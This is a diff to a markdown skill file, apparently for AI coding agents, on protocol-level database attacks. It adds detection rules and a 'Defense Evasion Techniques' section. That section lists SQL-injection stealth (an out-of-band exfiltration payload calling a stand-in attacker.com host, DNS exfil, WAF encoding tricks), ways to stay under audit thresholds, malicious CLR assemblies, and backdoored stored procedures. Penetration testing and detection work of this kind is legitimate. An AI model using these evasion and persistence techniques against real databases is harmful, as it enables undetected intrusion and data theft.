@@ -2,7 +2,7 @@
 name: database-attack
 description: "Direct attacks against database servers at the protocol level — distinct from web-based SQL injection (covered by web-sqli). This skill targets database listeners, authentication mechanisms, stored procedures, and protocol-level misconfigurations."
 origin: openclaw
-version: "0.1.19"
+version: "0.2.0.2"
 compatibility:
   - openclaw
   - claude-code
@@ -20,6 +20,7 @@ metadata:
   tool_count: 8
   guide_count: 5
   mitre: "TA0006-Credential Access"
+  last_reviewed: "2026-07-26"
 ---
 
 # Database Attack
@@ -315,6 +316,40 @@ Database privilege escalation follows distinct paths depending on the DBMS:
 3. SQL injection in Oracle-supplied PL/SQL packages (version-specific CVEs)
 4. `CREATE ANY PROCEDURE` privilege allows executing code in SYS schema
 5. Database link escalation: traverse DB links to reach higher-privilege instances
+
+## Detection Methods
+
+### Database Audit Logs
+- **Failed auth burst**: >10 failed logins per minute from same IP (brute force signature).
+- **Anomalous SELECT**: `SELECT * FROM users` from application service account (normally only specific columns).
+- **Schema enumeration**: Queries against `information_schema.tables`, `sys.tables`, `ALL_TABLES`.
+- **Bulk export**: `pg_dump`, `mysqldump`, `bcp` from non-admin source.
+
+### SIEM Detection Rules
+- **Splunk SPL**: `index=db sourcetype=postgresql:query | where query matches "pg_read_file|COPY TO"`
+- **Native audit**: PostgreSQL `pg_audit`, MySQL Enterprise Audit, Oracle Audit Vault.
+- **Imperva Data Security**: Database activity monitoring (DAM) platform.
+- **Microsoft Defender for SQL**: Native SQL Server threat detection.
+
+## Defense Evasion Techniques
+
+### SQL Injection Stealth
+- **Time-based blind**: `IF(condition, SLEEP(5), 0)` — extract via timing without output.
+- **Out-of-band exfil**: `LOAD_FILE('\\\\ attacker.com\\x')` (MySQL); `xp_dirtree` (MSSQL) for DNS exfil.
+- **Distributed queries**: Spread SQLi attempts across many sessions; below rate threshold.
+- **Encoding tricks**: Hex (`0x`), char(), URL encoding to evade WAF.
+
+### Query Stealth
+- **Use indexed columns**: Avoid full table scans that trigger audit alerts.
+- **Limit results**: `LIMIT 100` per query; below bulk export threshold.
+- **Off-hours queries**: Run during low-activity windows.
+- **Reuse legitimate connections**: Don't create new DB connections; use connection pool.
+
+### Lateral Movement Stealth
+- **Linked servers** (SQL Server): Use `sp_addlinkedserver` for cross-DB access; appears as legitimate config.
+- **PL/SQL packages** (Oracle): Use legitimate packages (UTL_HTTP, DBMS_LDAP) for outbound.
+- **CLR assembly** (SQL Server): Load malicious .NET assembly; persists across reboots.
+- **Stored procedure persistence**: Backdoor stored procedure; activates on specific trigger.
 
 ## Learning Resources
 
